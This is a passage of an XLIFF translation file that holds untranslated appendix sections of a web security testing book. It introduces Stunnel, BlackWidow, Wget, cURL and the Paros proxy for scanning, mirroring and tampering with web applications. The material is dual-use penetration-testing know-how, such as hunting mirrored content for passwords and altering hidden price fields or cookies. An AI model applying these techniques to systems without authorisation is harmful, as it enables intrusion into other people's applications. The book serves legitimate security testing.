          <source>Stunnel (&lt;a class="docLink" target="_blank" href="http://www.stunnel.org"&gt;http://www.stunnel.org&lt;/a&gt;) is an extremely useful tool if you want to set up a tunnel to a machine using Secure Sockets Layer (SSL). Stunnel is the &amp;quot;Universal SSL Wrapper&amp;quot; because it can be both a server and a client. This is a good option if you are having trouble scanning a Web server over SSL with Nikto, or you want to set up a covert channel to a given host. Fire up Stunnel, and then scan with no SSL options.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can use Stunnel to create an SSL connection from your machine to a target host the same way that your web browser would do. This allows you to directly interact with a machine that allows access only to content over HTTPS. That way you can use tools like TELNET or home-brew scripts that don't support SSL.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can refer to the documentation to use command-line switches if you want to include Stunnel commands in a script, but it is much easier to create a &lt;tt&gt;stunnel.conf&lt;/tt&gt; in the directory where you launch Stunnel. Following is the &lt;tt&gt;stunnel.conf.example&lt;/tt&gt; that comes with Stunnel:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>$ more stunnel.conf.example
client = yes
debug = debug
[pop3s]
accept = 127.0.0.1:1109
connect = pop3s.myisp.com:995

[imaps]
accept = 127.0.0.1:1439
delay = yes
connect = imaps.myisp.com:993

[smtps]
accept = 127.0.0.1:259
connect = smtps.myisp.com:465</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can use this as a basis to create your own &lt;tt&gt;stunnel.conf&lt;/tt&gt;. Perhaps something like the following would be plenty for scanning a Web server:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>client = yes
debug = debug

[scan]
accept = 127.0.0.1:8000
connect = www.scantarget.com:443</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Make sure the file is called &lt;tt&gt;stunnel.conf&lt;/tt&gt;, put it in the same directory as the Stunnel executable, and then launch it. Then scan via &lt;tt&gt;localhost tcp port 8000&lt;/tt&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This tool has a lot more features, but we have covered the functionality that we need to scan Web servers. Check out the documentation on the Web site for more information.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app03lev1sec5.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>BlackWidow</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec4.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>BlackWidow</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Although you can craft your own spider/crawler using Perl or Python, BlackWidow by SoftByte Labs has been around for a long time and is one of the best and fastest spidering tools out there. You can find it at &lt;a class="docLink" target="_blank" href="http://softbytelabs.com/Frames.html"&gt;http://softbytelabs.com/Frames.html&lt;/a&gt;. A 30-day trial is available for download, and then it's $39.95 to continue using it. Here is what the user interface looks like.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-8. BlackWidow's main screen.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>What a spider allows you to do is mirror the content on a server to your local machine for analysis. Then you can process all the content with scripts to look for things like developer comments, or usernames and passwords.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You enter the URL for scanning. Then you press the Enter key or you select Action, Start Scan from the toolbar. You can also specify strings or regular expressions that might be interesting.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Notice the statistics you get for a given site at the bottom of the window. Here is the directory structure of this Web server. It is useful to know how a server directory structure is laid out, because it can give hints as to directories to which there are no links. For instance, if you saw a directory that represented a date or some numerical sequence, you might be able to guess at other directories that could lead to some interesting discoveries.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-9. Filtering files to mirror.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-10. Results of mirroring a site.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Here is a capture of the threads in action. It is a tunable parameter under Settings, General Options, as seen in the following figure. Context-sensitive help is useful to describe what all the options mean.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-11. Threads downloading files.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The Link Errors tab allows you to discover broken links in the server content. This discovery is more useful to a Web master, but keep an eye out for patterns that could lend additional insight into the application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-12. Link errors&amp;mdash;pages that have been referenced, but don't exist.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec4.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app03lev1sec6.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Wget</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec5.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Wget</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Wget is included with most Linux and BSD distributions. It is a simple yet powerful command-line tool for accessing, downloading, or mirroring Web server content. Here are some of the options you will see if you use the &lt;tt&gt;-h&lt;/tt&gt; switch.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-13. Wget options.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This can be particularly useful if you want to download a single file or a directory of files. For instance, perhaps you want to demonstrate to the client that you can access content with no authentication. You can 'wget' the files with the exact URL. Doing so eliminates the possibility that there were any cached credentials in your browser.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Here is an example of downloading a corporate brochure from Foundstone's Web site:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-14. Downloading a file with Wget.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Wget is quite informative. It gives you a status report that might include the size of the file, the speed of download, and ETA. This is particularly useful if you want to download a directory or file but you don't know if you have time to grab another Red Bull from the fridge before it's done.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Let's say that you want to download all the files off the Gutenberg Project site, but you don't want MP3s. (The site actually has a reference that tells you how to use wget to grab the files you want.) Let's see how it works in practice.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-15. Mirroring the Gutenberg Project site.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This figure illustrates using the &lt;tt&gt;-m&lt;/tt&gt; option to mirror and the &lt;tt&gt;&amp;ndash;R&lt;/tt&gt; option to filter the MP3 file type. This works great if you come across a page with a list of files and you want to get them all without individually downloading them. A good example is a directory full of pictures from your friend's photo gallery. Just use &lt;tt&gt;wget &amp;ndash;r http://the.url.com&lt;/tt&gt; for the quickest solution. You can add additional switches to limit the directory depth, authentication, support cookies, and so on.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The wget tool is highly flexible and can do a lot of things, so you should explore it at length.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec5.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app03lev1sec7.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>cURL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec6.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>cURL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Another good command-line tool that is also a pen tester favorite is cURL from &lt;a class="docLink" target="_blank" href="http://curl.haxx.se/"&gt;http://curl.haxx.se/&lt;/a&gt;. This tool is a powerful utility with a lot of functionality, and like wget, it is scriptable. cURL and wget have a similar feature set and really come down to personal preference. We can explore some of the functionality so that you can see the syntax.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Let's start by getting a basic page.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-16. Downloading a file using cURL.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Here is the default page for &lt;a class="docLink" target="_blank" href="http://Foundstone.com"&gt;Foundstone.com&lt;/a&gt; piped to &lt;tt&gt;more&lt;/tt&gt;. Let's move on to something a little more advanced.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If you have ever conducted a Web application test, you have experienced some of the tedium of manually inputting values in forms to illicit errors. cURL lets you handle this at the command line. Let's look at the example from the cURL tutorial from the author (which you can find at &lt;a class="docLink" target="_blank" href="http://curl.haxx.se/docs/httpscripting.html"&gt;http://curl.haxx.se/docs/httpscripting.html&lt;/a&gt;). Let's say your submission to a given form looks like this:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>www.hotmail.com/when/junk.cgi?birthyear=1905&amp;amp;press=
 OK</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>To do this with cURL, we simply type this:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>curl "www.hotmail.com/when/junk.cgi?birthyear=
 1905&amp;amp;press=OK"</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In many cases, we might need to &lt;tt&gt;POST&lt;/tt&gt; the submission instead of using the syntax for &lt;tt&gt;GET&lt;/tt&gt;. This is easy to do when we issue the following:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>curl -d "birthyear=1905&amp;amp;press=%20OK%20"
 www.hotmail.com/when/junk.cgi</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Let's try it by submitting a search term to Packet Storm's search engine at &lt;a class="docLink" target="_blank" href="http://www.packetstormsecurity.org"&gt;http://www.packetstormsecurity.org&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Here is the file we downloaded.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-17. Downloading a file with cURL&amp;mdash;part two.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-18. Local copy of the downloaded file.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can perform file uploads, manipulate hidden fields, change the referrer and user agent data, and manipulate cookies.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>cURL's functionality has been put into a library for C and modules for Perl and Python so that you could use it in scripts and applications (documented at &lt;a class="docLink" target="_blank" href="http://curl.haxx.se/libcurl/"&gt;http://curl.haxx.se/libcurl/&lt;/a&gt;).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec6.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app03lev1sec8.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Paros</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec7.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Paros</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Paros has improved significantly in recent history and has an extensive feature set for testing the security of Web servers. Following are just a few of these features:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Local proxy allowing you to be the man in the middle for all requests and responses between your browser and the Web server</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Spidering</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Automated scanning engine with HTML reports</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Proxy configuration for using an upstream proxy if necessary</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>The ability to save all testing results to a session file</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You need to get the Paros software from &lt;a class="docLink" target="_blank" href="http://www.parosproxy.org"&gt;http://www.parosproxy.org&lt;/a&gt; and install it. (You must have at least version 1.42 of the Java JRE/JDK installed.) Launch Paros and then set your browser's proxy to &lt;tt&gt;localhost:8080&lt;/tt&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Paros allows you to see the interaction between your browser and the Web server and change those values as you see fit. This lends itself to exploring flaws in Web applications, including hidden fields that control the price of an item or cookie values that contain obvious authentication information of SQL queries that can be manipulated on the fly.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-19. Capturing HTTP traffic with Paros.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>After you start casing your target, you will see it appear in the Sites list. Let's set our browser to use localhost on port 8080 (if you have not changed Paros' defaults). Now, we can surf to a sample site and see what Paros does.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>After we go to a site in our browser, we will see the server and all the requests that our browser made.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Notice the server in the left-hand window, the Request and Response tabs, and the real-time log of all your requests below. The Request tab shows you the raw data that your browser sent to the server. The Response tab shows you the raw response.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Notice the directory layout that's already emerging from going to three pages. Here we see how the server responded when we requested a JavaScript resource file. These are the types of files that can yield all sorts of interesting data, including developer comments. Or perhaps you can glean something about the internal logic that is somehow flawed. You might also learn that disabling JavaScript in your browser can help you bypass some access control mechanism. Remember: The browser runs JavaScript, so the application has a certain level of trust that the browser will do what is expected.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If the site requires authentication, log in to the application using your Web browser. You can also set credentials for servers in the options if you are going to scan multiple servers at once.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-20. Inspecting responses.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Paros has both a built-in spider and an automated scanner. Running the spider is a good place to start. The spider follows every link on the site to provide all possible target URLs for the automated scanner. There is some cross-functionality here with Nikto, but the Paros scanner looks for things like default content and directories and injection points in form fields. No automated tool will conduct the testing for you, but the tools will give you hints about where to look for common flaws and mistakes. Sometimes the scanner will find a glaring flaw like IIS Unicode, which requires following a URL to demonstrate. Other times, the tool may only hint at the real problem. Weeding out false positives is part of why it all comes down to you and your most important tool: your brain.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec7.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
